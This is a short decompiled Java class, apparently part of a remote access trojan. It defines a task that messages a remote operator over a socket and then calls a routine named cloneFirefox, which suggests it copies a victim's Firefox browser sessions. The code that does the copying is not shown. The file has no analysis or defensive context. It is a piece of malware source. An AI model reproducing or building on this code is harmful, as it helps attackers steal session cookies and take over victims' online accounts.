package carLambo;

final class BrowserSessionClone implements Runnable {
   // $FF: synthetic field
   private RDPManager sdfsldf;

   BrowserSessionClone(RDPManager var1) {
      this.sdfsldf = var1;
      
   }

   public final void run() {
      RDPManager.sendMessageToSocket(this.sdfsldf, "Browser session cloning started. This will take a long time to complete.\nYou will be notified when complete.");
      RDPManager.cloneFirefox(this.sdfsldf);
   }
}
